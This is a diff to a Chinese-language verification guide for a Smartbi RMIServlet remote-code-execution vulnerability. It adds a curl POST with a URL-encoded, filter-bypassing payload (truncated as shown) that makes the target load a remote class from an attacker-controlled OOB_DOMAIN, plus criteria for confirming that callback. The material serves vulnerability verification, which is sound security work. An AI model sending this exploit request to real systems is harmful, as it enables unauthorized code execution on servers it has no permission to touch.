@@ -45,11 +45,21 @@ curl -s "http://target/smartbi/vision/RMIServlet" -o /dev/null -w "%{http_code}"
 
 ## 验证方法
 
+接口返回非 404 只说明路由存在，不算存在漏洞。这个接口的利用形态是服务端按我们给的地址去加载远端类，所以判据走带外：把 stub 地址换成我们自己控制的 `OOB_DOMAIN`，看它是否真的发起了外连。
+
 ```bash
-# 检测 RMIServlet 接口是否存在
-curl -s "http://target/smartbi/vision/RMIServlet" -o /dev/null -w "%{http_code}"
-# 返回非 404 即接口存在
+# 用本次的 OOB 地址作为载体发送请求（保持与 Payload 相同的编码绕过写法）
+curl -s "http://target/smartbi/vision/RMIServlet" \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d 'windowUnloading=&%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%'
 ```
+
+判据：`OOB_DOMAIN` 上收到目标服务器发起的 HTTP/RMI 请求（记录里能看到目标的源 IP），即服务端确实解析并加载了我们指定的远端地址。
+
+无带外条件时的次选判据：响应体出现我们这次给出的 `OOB_DOMAIN` 地址串（异常栈里带出被加载的 URL），这也是本次请求才引入的证据。
+
+反例：`POST /smartbi/vision/RMIServlet` 返回 200 或任意业务响应，但既没有带外请求、响应体里也没有本次地址 —— 只是接口接受了请求，命令执行不成立。
 
 ## 指纹确认
 
